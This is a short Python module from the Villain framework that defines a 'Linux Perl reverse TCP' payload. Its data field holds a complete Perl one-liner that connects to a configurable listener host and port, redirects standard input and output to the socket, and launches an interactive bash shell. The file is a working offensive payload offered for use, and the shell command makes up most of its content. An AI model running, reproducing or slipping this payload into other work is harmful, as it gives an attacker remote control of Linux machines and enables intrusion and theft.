# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Linux Perl reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic Perl reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'perl-no-sh',
        'os' : 'linux'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "perl -e 'use Socket;$i=\"*LHOST*\";$p=*LPORT*;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
   